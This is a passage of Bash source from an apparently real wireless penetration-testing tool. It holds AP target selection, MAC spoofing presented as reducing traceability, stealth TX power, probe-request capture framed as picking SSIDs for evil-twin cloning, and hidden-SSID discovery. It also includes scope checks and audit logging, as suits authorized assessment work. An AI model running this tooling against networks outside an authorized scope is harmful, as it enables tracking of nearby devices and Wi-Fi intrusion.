    # ── Build AP selection menu (with band column) ───────────────
    local menu_items=()
    local label cli_n vendor
    for i in "${!db_bssids[@]}"; do
        cli_n=0
        [[ -f "$CLIENT_DB" ]] && \
            cli_n=$(grep -c "	${db_bssids[$i]}	" "$CLIENT_DB" 2>/dev/null || echo 0)
        vendor=$(oui_lookup "${db_bssids[$i]}")
        printf -v label "%-16s %-17s CH:%-3s %-4s %-5s %sdBm [%d] %-8s" \
            "${db_ssids[$i]:0:16}"  "${db_bssids[$i]}" \
            "${db_channels[$i]}"    "${db_bands[$i]:-?}" \
            "${db_encs[$i]:0:5}"    "${db_powers[$i]}" \
            "$cli_n"                "${vendor:0:8}"
        menu_items+=("$i" "$label")
    done

    local idx
    idx=$(dialog \
        --title " AP Database — ${#db_bssids[@]} APs  [filter: $(
            case "$db_band_filter" in 2.4) echo "2.4 GHz";; 5) echo "5 GHz";; *) echo "All";; esac
        )] " \
        --menu "\n  SSID             BSSID             CH  Band  ENC   PWR   [C] Vendor\n  ──────────────────────────────────────────────────────────────────────" \
        24 90 12 \
        "${menu_items[@]}" \
        3>&1 1>&2 2>&3) || return

    local sel_bssid="${db_bssids[$idx]}"
    local sel_ssid="${db_ssids[$idx]}"
    local sel_ch="${db_channels[$idx]}"
    local sel_band="${db_bands[$idx]}"
    local sel_enc="${db_encs[$idx]}"
    local sel_auth="${db_auths[$idx]}"
    local sel_pwr="${db_powers[$idx]}"
    local sel_ts="${db_times[$idx]}"

    # ── Build client list for this AP ────────────────────────────
    local cli_detail=""
    local shown=0
    if [[ -f "$CLIENT_DB" ]]; then
        local cmac cbssid cssid cpwr cts cprobed
        while IFS=$'\t' read -r cmac cbssid cssid cpwr cts cprobed; do
            [[ "$cmac" =~ ^# || -z "$cmac" ]] && continue
            [[ "$cbssid" == "$sel_bssid" ]] || continue
            cli_detail+="    ${cmac}  pwr:${cpwr}dBm  seen:${cts}"
            [[ -n "$cprobed" ]] && cli_detail+="  probing:[${cprobed}]"
            cli_detail+=$'\n'
            (( shown++ ))
            [[ $shown -ge 10 ]] && { cli_detail+="    … (more in $CLIENT_DB)"$'\n'; break; }
        done < "$CLIENT_DB"
    fi
    [[ -z "$cli_detail" ]] && cli_detail="    (none recorded)"$'\n'

    # ── Attack recommendations for this AP ───────────────────────
    local recs; recs=$(recommend_attacks "$sel_enc" "$sel_auth")

    dialog --title " AP Details: $sel_ssid " \
           --msgbox "\
\n  SSID     : $sel_ssid\
\n  BSSID    : $sel_bssid\
\n  Channel  : $sel_ch  (${sel_band})\
\n  Security : $sel_enc  (Auth: $sel_auth)\
\n  Power    : ${sel_pwr} dBm\
\n  Last Seen: $sel_ts\
\n\
\n  Connected Clients:\
\n${cli_detail}\
\n  Recommended Attacks:\
\n${recs}" \
           28 76

    # ── Offer to set as target ───────────────────────────────────
    dialog --title " Set as Target? " \
           --yesno "\n  Set '$sel_ssid' as the current attack target?" 8 52
    if [[ $? -eq 0 ]]; then
        TARGET_BSSID="$sel_bssid"
        TARGET_SSID="$sel_ssid"
        TARGET_CHANNEL="$sel_ch"
        TARGET_ENC="$sel_enc"
        TARGET_AUTH="$sel_auth"
        TARGET_CLIENT_COUNT="$shown"
        TARGET_VENDOR=$(oui_lookup "$TARGET_BSSID")
        save_session
        audit_log "TARGET SET FROM DB: ssid='$TARGET_SSID' bssid=$TARGET_BSSID"
        dialog --title " Target Set " \
               --infobox "\n  Target: $TARGET_SSID\n  BSSID : $TARGET_BSSID  CH:$TARGET_CHANNEL" \
               7 60
        sleep 1
    fi
}

# ────────────────────────────────────────────────────────────
#  SESSION SETTINGS  — global interface + band selector
#  Changes here pre-fill every per-task interface picker and
#  determine which frequencies are scanned / which output
#  subdirectory captures land in (2.4GHz/ vs 5GHz/ vs dual/).
# ────────────────────────────────────────────────────────────
session_settings() {
    draw_banner

    # ── Step 0: MAC address spoofing toggle ───────────────────────
    local mac_preselect="off"
    [[ "${MAC_SPOOF_ENABLED:-0}" -eq 1 && "${MAC_SPOOF_MODE:-random}" == "random"   ]] && mac_preselect="random"
    [[ "${MAC_SPOOF_ENABLED:-0}" -eq 1 && "${MAC_SPOOF_MODE:-random}" == "specific" ]] && mac_preselect="specific"
    local mac_choice
    mac_choice=$(dialog --no-tags \
        --title " Session Settings — Step 0/3: MAC Address Spoofing " \
        --default-item "$mac_preselect" \
        --menu "\
\n  MAC spoofing changes your adapter's hardware address before\
\n  putting it in monitor mode, reducing traceability.\
\n\
\n  OFF is the default — enable only when authorized and needed.\
\n\
\n  Current: $(if [[ ${MAC_SPOOF_ENABLED:-0} -eq 1 ]]; then echo "ON (${MAC_SPOOF_MODE})"; else echo "OFF"; fi)\n" \
        16 68 3 \
        "off"      "  Off (default) — use real hardware MAC" \
        "random"   "  Random MAC    — new random address each session" \
        "specific" "  Specific MAC  — enter a fixed address below" \
        3>&1 1>&2 2>&3) || return

    case "$mac_choice" in
        off)
            MAC_SPOOF_ENABLED=0
            MAC_SPOOF_MODE="random"
            ;;
        random)
            MAC_SPOOF_ENABLED=1
            MAC_SPOOF_MODE="random"
            ;;
        specific)
            MAC_SPOOF_ENABLED=1
            MAC_SPOOF_MODE="specific"
            local new_addr
            new_addr=$(dialog --title " MAC Address " \
                --inputbox "\n  Enter specific MAC address (XX:XX:XX:XX:XX:XX):" \
                9 58 "$MAC_SPOOF_ADDR" 3>&1 1>&2 2>&3) || return
            if validate_bssid "$new_addr"; then
                MAC_SPOOF_ADDR="${new_addr^^}"
            else
                dialog --title " Invalid MAC " \
                       --msgbox "\n  '$new_addr' is not a valid MAC address.\n  Format: AA:BB:CC:DD:EE:FF" 8 52
                return
            fi
            ;;
    esac

    # ── Step 1: pick interface ────────────────────────────────────
    local ifaces=()
    mapfile -t ifaces < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')

    if [[ ${#ifaces[@]} -eq 0 ]]; then
        dialog --title " No Interfaces " \
               --msgbox "\n  No wireless interfaces found.\n\n  Plug in your adapter and run:\n    iw dev\n  to verify it is recognised.\n\n  Recommended: Alfa AWUS036ACHM (MT7612U chipset)\n  See Help > Adapters for the full 2-3 adapter setup guide." \
               12 58
        return
    fi

    # ── Adapter count advisory ────────────────────────────────────
    if [[ ${#ifaces[@]} -eq 1 ]]; then
        dialog --title " Single Adapter Detected " \
               --msgbox "\
\n  Only 1 wireless adapter found: ${ifaces[0]}\
\n\
\n  RECOMMENDED: Use 2-3 adapters per assessment:\
\n\
\n  Adapter 1 (you have): Monitor + injection attacks\
\n  Adapter 2 (add one):  Parallel 5GHz or 2.4GHz scan\
\n  Adapter 3 (optional): Connected to target for MITM\
\n\
\n  Top pick: Alfa AWUS036ACHM (MT7612U, dual-band)\
\n  See Help > Adapters for the complete guide.\
\n\
\n  Continuing with single adapter — all attacks still work." \
               14 62
    fi

    local menu_items=()
    menu_items+=("none" "  -- No global default (pick per task) --")
    for iface in "${ifaces[@]}"; do
        local phy mode
        phy=$(iw dev "$iface" info 2>/dev/null | awk '/wiphy/{print "phy"$2}' || echo "?")
        mode=$(iw dev "$iface" info 2>/dev/null | awk '/type/{print $2}' || echo "?")
        menu_items+=("$iface" "  ${phy}  |  mode: ${mode}  —  ${iface}")
    done

    local preselect="${GLOBAL_IFACE:-none}"
    local max_h=$(( $(tput lines 2>/dev/null || echo 24) - 4 ))
    local dlg_h=$(( ${#ifaces[@]} + 13 ))
    [[ $dlg_h -gt $max_h ]] && dlg_h=$max_h

    local chosen_iface
    chosen_iface=$(dialog \
        --title " Session Settings — Step 1/3: Default Interface " \
        --default-item "$preselect" \
        --menu "\
\n  Choose the interface to pre-select in every attack.\
\n  You can still override per-task if needed.\
\n\
\n  Current: ${GLOBAL_IFACE:-none}\n" \
        "$dlg_h" 68 $(( ${#ifaces[@]} + 1 )) \
        "${menu_items[@]}" \
        3>&1 1>&2 2>&3) || return

    [[ "$chosen_iface" == "none" ]] && chosen_iface=""
    GLOBAL_IFACE="$chosen_iface"
    LAST_IFACE="$chosen_iface"

    # ── Step 2: pick band ─────────────────────────────────────────
    local chosen_band
    chosen_band=$(dialog --no-tags \
        --title " Session Settings — Step 2/3: Frequency Band " \
        --default-item "$SELECTED_BAND" \
        --menu "\
\n  Select which frequency band to use for scans and attacks.\
\n\
\n  2.4 GHz:  channels 1-14  — longer range, more congested\
\n  5 GHz:    channels 36-165 — faster, less interference\
\n  Dual:     scans and attacks on both simultaneously\
\n            (requires adapter that supports dual-band monitor mode)\
\n\
\n  Current: $(band_label)\
\n\
\n  Output will be saved under:\
\n    wpt_output/2.4GHz/   wpt_output/5GHz/   wpt_output/dual/\n" \
        22 72 3 \
        "2.4"  "  2.4 GHz only   (channels 1-14,   --band bg)" \
        "5"    "  5 GHz only     (channels 36-165,  --band a)" \
        "dual" "  Dual-band      (all channels,     --band abg)" \
        3>&1 1>&2 2>&3) || return

    SELECTED_BAND="$chosen_band"

    # ── Step 3: TX power ──────────────────────────────────────────
    local tx_choice
    tx_choice=$(dialog --no-tags \
        --title " Session Settings — Step 3/3: TX Power " \
        --default-item "normal" \
        --menu "\
\n  Set transmit power for wireless attacks.\
\n  Higher power = greater range but may violate local regulations.\
\n\
\n  Current: ${TX_POWER_DBM} dBm\
\n  Note: actual power is capped by driver/regulatory domain.\n" \
        17 68 4 \
        "stealth"  "  Stealth  (5 dBm)  — minimal RF footprint" \
        "normal"   "  Normal  (20 dBm)  — standard operational power" \
        "max"      "  Max     (30 dBm)  — maximum range (check local regs)" \
        "custom"   "  Custom  — enter specific dBm value" \
        3>&1 1>&2 2>&3) || { save_session; return; }

    local new_tx_dbm=20
    case "$tx_choice" in
        stealth) new_tx_dbm=5  ;;
        normal)  new_tx_dbm=20 ;;
        max)     new_tx_dbm=30 ;;
        custom)
            local cust_tx
            cust_tx=$(dialog --title " TX Power " \
                --inputbox "\n  Enter TX power in dBm (1-30):" \
                8 44 "$TX_POWER_DBM" 3>&1 1>&2 2>&3) || { save_session; return; }
            if [[ "$cust_tx" =~ ^[0-9]+$ && $cust_tx -ge 1 && $cust_tx -le 30 ]]; then
                new_tx_dbm=$cust_tx
            else
                dialog --title " Invalid Value " \
                       --msgbox "\n  '$cust_tx' is not a valid dBm value (1-30).\n  Keeping current: ${TX_POWER_DBM} dBm" 8 52
                new_tx_dbm=$TX_POWER_DBM
            fi
            ;;
    esac
    TX_POWER_DBM=$new_tx_dbm
    # Apply to currently selected interface if set
    if [[ -n "$GLOBAL_IFACE" ]]; then
        set_tx_power "$GLOBAL_IFACE" 2>/dev/null || true
    fi

    save_session

    local iface_display="${GLOBAL_IFACE:-none (pick per task)}"
    local mac_display; mac_display=$(if [[ ${MAC_SPOOF_ENABLED:-0} -eq 1 ]]; then echo "ON (${MAC_SPOOF_MODE})"; else echo "OFF"; fi)
    dialog --title " Session Settings Saved " \
           --msgbox "\
\n  Settings applied:\
\n\
\n  Default Interface : ${iface_display}\
\n  Active Band       : $(band_label)\
\n  MAC Spoofing      : ${mac_display}\
\n  TX Power          : ${TX_POWER_DBM} dBm\
\n  Output directory  : wpt_output/$(
    case "$SELECTED_BAND" in 5) echo "5GHz";; dual) echo "dual";; *) echo "2.4GHz";; esac\
)/\
\n\
\n  These settings persist until you change them or exit.\
\n  Each attack's interface picker will pre-select the default." \
           16 66
    audit_log "SESSION SETTINGS: iface='${GLOBAL_IFACE:-none}' band=$(band_label) mac_spoof=${MAC_SPOOF_ENABLED} tx_power=${TX_POWER_DBM}dBm"
}

# ════════════════════════════════════════════════════════════
#  FEATURE 1 — MAC ADDRESS SPOOFING
# ════════════════════════════════════════════════════════════

spoof_mac() {
    local iface="$1"
    [[ -z "$iface" ]] && return 1
    if ! command -v macchanger &>/dev/null; then
        t_warn "macchanger not found — MAC spoofing skipped. Install: apt install macchanger"
        return 0
    fi
    # Save original MAC
    local orig; orig=$(ip link show "$iface" 2>/dev/null | awk '/link\/ether/{print $2}' | head -1)
    [[ -n "$orig" ]] && ORIGINAL_MACS["$iface"]="$orig"
    ip link set "$iface" down 2>/dev/null || true
    if [[ "$MAC_SPOOF_MODE" == "specific" && -n "$MAC_SPOOF_ADDR" ]]; then
        macchanger -m "$MAC_SPOOF_ADDR" "$iface" &>/dev/null
        t_ok "MAC set to $MAC_SPOOF_ADDR on $iface  (was: ${orig:-?})"
        audit_log "MAC SPOOF: iface=$iface mode=specific new=$MAC_SPOOF_ADDR orig=${orig:-?}"
    else
        macchanger -r "$iface" &>/dev/null
        local new_mac; new_mac=$(ip link show "$iface" 2>/dev/null | awk '/link\/ether/{print $2}' | head -1)
        t_ok "MAC randomized on $iface  (was: ${orig:-?}  now: ${new_mac:-?})"
        audit_log "MAC SPOOF: iface=$iface mode=random new=${new_mac:-?} orig=${orig:-?}"
    fi
    ip link set "$iface" up 2>/dev/null || true
}

restore_mac() {
    local iface="$1"
    [[ -z "${ORIGINAL_MACS[$iface]:-}" ]] && return 0
    if ! command -v macchanger &>/dev/null; then return 0; fi
    local orig="${ORIGINAL_MACS[$iface]}"
    ip link set "$iface" down 2>/dev/null || true
    macchanger -m "$orig" "$iface" &>/dev/null || true
    ip link set "$iface" up 2>/dev/null || true
    unset "ORIGINAL_MACS[$iface]"
    audit_log "MAC RESTORED: iface=$iface mac=$orig"
}

# ════════════════════════════════════════════════════════════
#  FEATURE 2/5 — 802.11w MFP DETECTION
# ════════════════════════════════════════════════════════════

detect_mfp() {
    local bssid="$1" cap_file="$2"
    [[ -z "$bssid" || -z "$cap_file" || ! -f "$cap_file" ]] && echo "" && return
    if ! command -v tshark &>/dev/null; then echo "" && return; fi
    # Extract RSN capabilities field from beacon frames via tshark
    local rsn_caps
    rsn_caps=$(tshark -r "$cap_file" \
        -Y "wlan.bssid==${bssid} && wlan.fc.type_subtype==8" \
        -T fields -e wlan_mgt.rsn.capabilities 2>/dev/null | head -1)
    if [[ -n "$rsn_caps" ]]; then
        local caps_int
        caps_int=$(( 16#${rsn_caps//0x/} ))  2>/dev/null || caps_int=0
        if (( (caps_int & 0x80) != 0 )); then
            echo "required"
        elif (( (caps_int & 0x40) != 0 )); then
            echo "capable"
        else
            echo "none"
        fi
    else
        # Fallback: check cipher field in CSV — CCMP hints at MFP-capable
        local cipher_hint
        cipher_hint=$(grep -i "^${bssid}" "${TMPDIR_PT}/scan-01.csv" 2>/dev/null | \
            awk -F',' '{print $7}' | tr -d ' ' | head -1)
        if [[ "${cipher_hint^^}" == *"CCMP"* ]]; then
            echo "capable"
        else
            echo ""
        fi
    fi
}

# ════════════════════════════════════════════════════════════
#  FEATURE 3 — SCOPE ENFORCEMENT
# ════════════════════════════════════════════════════════════

# Returns 0 (in-scope) or 1 (out-of-scope / not in list)
scope_check() {
    local bssid="${1^^}" ssid="$2"
    [[ -z "$SCOPE_FILE" || ! -f "$SCOPE_FILE" ]] && return 0
    local line_count; line_count=$(grep -cv '^\s*#' "$SCOPE_FILE" 2>/dev/null || echo 0)
    [[ "$line_count" -eq 0 ]] && return 0  # empty scope = all in scope
    while IFS= read -r entry; do
        entry="${entry%%#*}"   # strip inline comments
        entry="${entry// /}"  # strip spaces
        [[ -z "$entry" ]] && continue
        local entry_up="${entry^^}"
        [[ "$entry_up" == "$bssid"  ]] && return 0
        [[ "$entry"    == "$ssid"   ]] && return 0
    done < "$SCOPE_FILE"
    return 1
}

scope_management() {
    while true; do
        local n_entries
        n_entries=$(grep -cv '^\s*#' "$SCOPE_FILE" 2>/dev/null || echo 0)
        local action
        action=$(dialog --title " Scope Management  [$n_entries entries] " \
            --menu "\n  Manage the engagement scope list.\n  Empty scope = all targets in scope.\n" \
            16 62 5 \
            "view"   "  View current scope entries" \
            "add"    "  Add BSSID or SSID to scope" \
            "remove" "  Remove entry from scope" \
            "clear"  "  Clear entire scope (open engagement)" \
            "toggle" "  Toggle scope enforcement  [currently: $(if [[ ${SCOPE_ENFORCED:-1} -eq 1 ]]; then echo ON; else echo OFF; fi)]" \
            3>&1 1>&2 2>&3) || return

        case "$action" in
            view)
                if [[ -f "$SCOPE_FILE" && -s "$SCOPE_FILE" ]]; then
                    dialog --title " Current Scope " --textbox "$SCOPE_FILE" 20 62
                else
                    dialog --title " Scope Empty " \
                           --msgbox "\n  No scope entries set.\n  All targets are currently in scope." 8 50
                fi
                ;;
            add)
                local entry
                entry=$(dialog --title " Add Scope Entry " \
                    --inputbox "\n  Enter BSSID (AA:BB:CC:DD:EE:FF) or plain SSID:" \
                    9 62 "" 3>&1 1>&2 2>&3) || continue
                [[ -z "$entry" ]] && continue
                printf '%s\n' "$entry" >> "$SCOPE_FILE"
                audit_log "SCOPE ADD: $entry"
                dialog --title " Added " --infobox "\n  Added to scope: $entry" 5 44
                sleep 1
                ;;
            remove)
                local rem
                rem=$(dialog --title " Remove Scope Entry " \
                    --inputbox "\n  Enter exact BSSID or SSID to remove:" \
                    9 62 "" 3>&1 1>&2 2>&3) || continue
                if [[ -f "$SCOPE_FILE" ]]; then
                    local tmpf="${TMPDIR_PT}/scope_rem_$$"
                    grep -v "^${rem}$" "$SCOPE_FILE" > "$tmpf" && mv "$tmpf" "$SCOPE_FILE"
                    audit_log "SCOPE REMOVE: $rem"
                fi
                ;;
            clear)
                dialog --title " Clear Scope " \
                       --yesno "\n  Clear all scope entries?\n  (All targets will be considered in scope)" \
                       9 52
                [[ $? -eq 0 ]] && : > "$SCOPE_FILE" && audit_log "SCOPE CLEARED"
                ;;
            toggle)
                if [[ "${SCOPE_ENFORCED:-1}" -eq 1 ]]; then
                    SCOPE_ENFORCED=0
                    dialog --title " Scope Enforcement " \
                           --infobox "\n  Scope enforcement DISABLED.\n  Out-of-scope warnings suppressed." 7 50
                else
                    SCOPE_ENFORCED=1
                    dialog --title " Scope Enforcement " \
                           --infobox "\n  Scope enforcement ENABLED.\n  Out-of-scope targets will require confirmation." 7 56
                fi
                sleep 1
                audit_log "SCOPE ENFORCED=$SCOPE_ENFORCED"
                ;;
        esac
    done
}

# ════════════════════════════════════════════════════════════
#  FEATURE 4 — TX POWER CONTROL
# ════════════════════════════════════════════════════════════

set_tx_power() {
    local iface="$1"
    [[ -z "$iface" ]] && return 1
    if ! command -v iw &>/dev/null; then return 1; fi
    # Save original TX power
    if [[ -z "${ORIGINAL_TXPOWER[$iface]:-}" ]]; then
        local orig_pwr
        orig_pwr=$(iw dev "$iface" info 2>/dev/null | awk '/txpower/{print $2}' | head -1)
        [[ -n "$orig_pwr" ]] && ORIGINAL_TXPOWER["$iface"]="$orig_pwr"
    fi
    # Apply new TX power (iw uses mBm = dBm * 100)
    local mbm=$(( TX_POWER_DBM * 100 ))
    iw dev "$iface" set txpower fixed "$mbm" 2>/dev/null && \
        audit_log "TX POWER SET: iface=$iface power=${TX_POWER_DBM}dBm" || \
        audit_log "TX POWER SET FAILED: iface=$iface (driver may not support)"
}

restore_tx_power() {
    local iface="$1"
    [[ -z "${ORIGINAL_TXPOWER[$iface]:-}" ]] && return 0
    if ! command -v iw &>/dev/null; then return 0; fi
    local orig="${ORIGINAL_TXPOWER[$iface]}"
    local mbm; mbm=$(awk "BEGIN{printf \"%d\", ${orig}*100}" 2>/dev/null || echo "2000")
    iw dev "$iface" set txpower fixed "$mbm" 2>/dev/null || true
    unset "ORIGINAL_TXPOWER[$iface]"
    audit_log "TX POWER RESTORED: iface=$iface power=${orig}dBm"
}

# ════════════════════════════════════════════════════════════
#  FEATURE 6 — AP FINGERPRINTING
# ════════════════════════════════════════════════════════════

fingerprint_ap() {
    local bssid="$1" cap_file="$2"
    [[ -z "$bssid" || -z "$cap_file" || ! -f "$cap_file" ]] && echo "" && return
    if ! command -v tshark &>/dev/null; then echo "" && return; fi
    local flags=()
    # 802.11r — Fast BSS Transition
    if tshark -r "$cap_file" \
         -Y "wlan.bssid==${bssid} && wlan.fc.type_subtype==8" \
         -T fields -e wlan.mobility_domain 2>/dev/null | grep -q '.'; then
        flags+=("11r")
    fi
    # 802.11k — Radio Management
    if tshark -r "$cap_file" \
         -Y "wlan.bssid==${bssid} && wlan.fc.type_subtype==8" \
         -T fields -e wlan.rm.enabled.capabilities 2>/dev/null | grep -q '.'; then
        flags+=("11k")
    fi
    # 802.11v — BSS Transition Management
    if tshark -r "$cap_file" \
         -Y "wlan.bssid==${bssid} && wlan.fc.type_subtype==8" \
         -T fields -e wlan.bss.transition 2>/dev/null | grep -q '.'; then
        flags+=("11v")
    fi
    # Vendor OUI hint
    local vendor; vendor=$(oui_lookup "$bssid")
    local vendor_tag="Unknown"
    if [[ -n "$vendor" ]]; then
        case "${vendor,,}" in
            *cisco*)   vendor_tag="Cisco"   ;;
            *ubiquiti*|*ubnt*) vendor_tag="Ubiquiti" ;;
            *aruba*)   vendor_tag="Aruba"   ;;
            *ruckus*)  vendor_tag="Ruckus"  ;;
            *mikrotik*) vendor_tag="Mikrotik" ;;
            *tp-link*) vendor_tag="TP-Link" ;;
            *netgear*) vendor_tag="Netgear" ;;
            *)         vendor_tag="${vendor:0:10}" ;;
        esac
    fi
    local fp="${vendor_tag}"
    for f in "${flags[@]}"; do fp+=":${f}"; done
    [[ -z "${flags[*]}" ]] && fp+=":none"
    echo "$fp"
}

# ────────────────────────────────────────────────────────────
#  HELPER: find hostapd-wpe binary
# ────────────────────────────────────────────────────────────
find_hostapd_wpe() {
    for p in hostapd-wpe /usr/local/bin/hostapd-wpe /usr/sbin/hostapd-wpe; do
        if command -v "$p" &>/dev/null || [[ -x "$p" ]]; then
            HOSTAPD_WPE="$p"; return 0
        fi
    done
    return 1
}

# ════════════════════════════════════════════════════════════
#  FEATURE 7 — CLIENT PROBE CAPTURE
# ════════════════════════════════════════════════════════════

probe_capture() {
    draw_banner

    dialog --title " Client Probe Capture — Overview " \
           --msgbox "\
\n  HOW IT WORKS\
\n  ────────────────────────────────────────────────────\
\n  Passively monitors probe request frames broadcast by\
\n  nearby devices.  Every device constantly sends probes\
\n  for networks it has previously connected to.\
\n\
\n  WHAT YOU LEARN\
\n  • Which SSIDs each client device is hunting for\
\n  • Home/office network names, travel hotspot names\
\n  • Perfect SSID to clone for a convincing evil-twin\
\n\
\n  OUTPUT\
\n  • probes_<timestamp>.tsv saved to wpt_output/probe_capture/\
\n  • MAC → SSID pairs also written to the client database\
\n  • Requires tshark for live parsing (apt install tshark)" \
           22 66
    [[ $? -ne 0 ]] && return

    SELECTED_IFACE=$(pick_interface "Select interface for passive probe capture:") || return

    TAB_PROBE_DUR=$(dialog \
        --title " Capture Duration " \
        --default-item "60" \
        --menu "\n  How long to listen for probe requests?\n" \
        13 54 4 \
        "30"  "  30 seconds  (quick sweep)" \
        "60"  "  60 seconds  (recommended)" \
        "120" "  2 minutes   (busy environments)" \
        "300" "  5 minutes   (thorough / low-traffic areas)" \
        3>&1 1>&2 2>&3) || return

    local tab_name="ProbeCapture"
    spawn_tab "$tab_name" "tab_probe_capture" || return
    notify_tab_launched "$tab_name"
}

tab_probe_capture() {
    local probe_dur="${TAB_PROBE_DUR:-60}"
    t_head "Client Probe Capture"
    t_data "Mode     : Passive probe-request monitoring"
    t_data "Iface    : $SELECTED_IFACE"
    t_data "Duration : ${probe_dur}s"
    t_data "Output   : ${OUTPUT_DIR}/probe_capture/"
    audit_log "PROBE CAPTURE START: iface=$SELECTED_IFACE dur=${probe_dur}s"
    _line

    t_info "Enabling monitor mode on $SELECTED_IFACE ..."
    local mon; mon=$(put_in_monitor "$SELECTED_IFACE") || return 1
    t_ok "Monitor interface: $mon"
    trap "_tab_cleanup_on_signal mon; exit 0" INT TERM

    local probe_dir="${OUTPUT_DIR}/probe_capture"
    mkdir -p "$probe_dir"
    local ts; ts=$(date +%Y%m%d_%H%M%S)
    local cap_prefix="${probe_dir}/probe_${ts}"

    t_info "Capturing probes for ${probe_dur}s ..."
    t_cmd "airodump-ng -w $cap_prefix $mon"
    airodump-ng --output-format pcap -w "$cap_prefix" "$mon" &>/dev/null &
    local dump_pid=$!
    trap "_tab_cleanup_on_signal mon $dump_pid; exit 0" INT TERM

    for i in $(seq 1 "$probe_dur"); do
        echo -ne "\r  Capturing: ${i}/${probe_dur}s ..."
        sleep 1
    done
    echo
    kill "$dump_pid" 2>/dev/null || true

    local cap_file="${cap_prefix}-01.cap"
    if [[ ! -f "$cap_file" ]]; then
        t_warn "No capture file produced."
        restore_single_interface "$mon"
        return 1
    fi

    _line
    t_info "Parsing probe requests ..."
    local probe_out="${probe_dir}/probes_${ts}.tsv"
    printf '#ClientMAC\tProbed_SSID\n' > "$probe_out"

    if command -v tshark &>/dev/null; then
        local probe_count=0
        while IFS=$'\t' read -r probe_mac probe_ssid; do
            [[ -z "$probe_mac" || ${#probe_mac} -lt 17 ]] && continue
            printf '%s\t%s\n' "$probe_mac" "$probe_ssid" >> "$probe_out"
            client_db_upsert "$probe_mac" "" "" "" "$probe_ssid"
            t_data "  ${probe_mac}  →  ${probe_ssid:-<broadcast>}"
            (( probe_count++ )) || true
        done < <(tshark -r "$cap_file" -Y "wlan.fc.type_subtype==4" \
                        -T fields -e wlan.sa -e wlan.ssid 2>/dev/null | \
                 awk -F'\t' '{print $1"\t"$2}' | sort -u)
        t_ok "Captured ${probe_count} unique probe entries."
    else
        t_warn "tshark not available — raw capture saved only."
    fi

    hash_file "$cap_file"
    audit_log "PROBE CAPTURE: ${cap_file} → probes saved to $probe_out"
    restore_single_interface "$mon"
}

# ════════════════════════════════════════════════════════════
#  FEATURE 8 — HIDDEN SSID DISCOVERY
# ════════════════════════════════════════════════════════════

# discover_hidden_ssids: parse an existing scan capture for hidden SSIDs
discover_hidden_ssids() {
    local cap_file="${1:-}"
    if [[ -z "$cap_file" || ! -f "$cap_file" ]]; then
        dialog --title " Hidden SSID Discovery " \
               --msgbox "\n  No capture file provided.\n  Run a scan first (menu item 1)." 8 50
        return 1
    fi

    if ! command -v tshark &>/dev/null; then
        dialog --title " tshark Required " \
               --msgbox "\n  tshark is required for SSID parsing.\n  Install: apt install tshark" 8 50
        return 1
    fi

    dialog --title " Probing for Hidden SSIDs ... " \
           --infobox "\n  Parsing probe-response and beacon frames\n  from capture file ..." 7 52
    sleep 1

    local -A found_ssids
    # Phase 1: probe responses (type_subtype=5) from the hidden AP
    while IFS=$'\t' read -r src ssid; do
        [[ -z "$src" || -z "$ssid" ]] && continue
        [[ "$src" == "${TAB_HIDDEN_TARGET_BSSID:-}" || -z "$TAB_HIDDEN_TARGET_BSSID" ]] && \
            found_ssids["$ssid"]="$src"
    done < <(tshark -r "$cap_file" -Y "wlan.fc.type_subtype==5" \
                    -T fields -e wlan.sa -e wlan.ssid 2>/dev/null)

    # Phase 2: beacon frames with non-empty SSID
    while IFS=$'\t' read -r src ssid; do
        [[ -z "$src" || -z "$ssid" || "$ssid" == "<hidden>" ]] && continue
        found_ssids["$ssid"]="$src"
    done < <(tshark -r "$cap_file" -Y "wlan.fc.type_subtype==8" \
                    -T fields -e wlan.sa -e wlan.ssid 2>/dev/null)

    if [[ ${#found_ssids[@]} -eq 0 ]]; then
        dialog --title " Hidden SSID Discovery " \
               --msgbox "\n  No hidden SSIDs discovered from passive analysis.\n\n  Try deauth-based active discovery:\n  Use menu item 15 for active probing." 11 58
        return 0
    fi

    # Build results menu
    local menu_items=()
    for ssid in "${!found_ssids[@]}"; do
        menu_items+=("$ssid" "  BSSID: ${found_ssids[$ssid]}  SSID: $ssid")
    done

    local selected
    selected=$(dialog --title " Hidden SSIDs Discovered  [${#found_ssids[@]} found] " \
        --menu "\n  Select discovered SSID to set as target:" \
        16 70 "${#found_ssids[@]}" \
        "${menu_items[@]}" \
        3>&1 1>&2 2>&3) || return 0

    if [[ -n "$selected" ]]; then
        TARGET_SSID="$selected"
        TARGET_BSSID="${found_ssids[$selected]}"
        save_session
        audit_log "HIDDEN SSID FOUND: ssid='$TARGET_SSID' bssid=$TARGET_BSSID"
        dialog --title " Target Updated " \
               --infobox "\n  Hidden SSID set as target:\n  SSID  : $TARGET_SSID\n  BSSID : $TARGET_BSSID" 8 52
        sleep 1
    fi
}

tab_discover_hidden_ssids() {
    t_head "Hidden SSID Discovery"
    t_data "Target BSSID : ${TAB_HIDDEN_TARGET_BSSID:-any}"
    t_data "Mode         : Passive + optional active deauth"
    audit_log "HIDDEN SSID START: bssid=${TAB_HIDDEN_TARGET_BSSID:-any} iface=$SELECTED_IFACE"
    _line

    local iface="${SELECTED_IFACE:-}"
    if [[ -z "$iface" ]]; then
        t_err "No interface selected. Set one in Session Settings."
        return 1
    fi

    t_info "Enabling monitor mode on $iface ..."
    local mon; mon=$(put_in_monitor "$iface") || return 1
    t_ok "Monitor interface: $mon"
    trap "_tab_cleanup_on_signal mon; exit 0" INT TERM

    local out_dir="${OUTPUT_DIR}/hidden_ssid"
    mkdir -p "$out_dir"
    local ts; ts=$(date +%Y%m%d_%H%M%S)
    local cap_prefix="${out_dir}/hidden_${ts}"
    local scan_dur=30

    t_info "Passive scan for ${scan_dur}s ..."
    airodump-ng --output-format pcap -w "$cap_prefix" "$mon" &>/dev/null &
    local dump_pid=$!
    trap "_tab_cleanup_on_signal mon $dump_pid; exit 0" INT TERM
    sleep "$scan_dur"
    kill "$dump_pid" 2>/dev/null || true
    sleep 1

    local cap_file="${cap_prefix}-01.cap"
    if [[ -f "$cap_file" ]] && command -v tshark &>/dev/null; then
        t_info "Parsing probe responses and beacons ..."
        local found=0
        while IFS=$'\t' read -r src ssid; do
            [[ -z "$ssid" || "$ssid" == "<hidden>" ]] && continue
            [[ -n "$TAB_HIDDEN_TARGET_BSSID" && "$src" != "$TAB_HIDDEN_TARGET_BSSID" ]] && continue
            t_ok "SSID revealed: '$ssid'  (from: $src)"
            audit_log "HIDDEN SSID REVEALED: ssid='$ssid' bssid=$src"
            (( found++ )) || true
        done < <(tshark -r "$cap_file" \
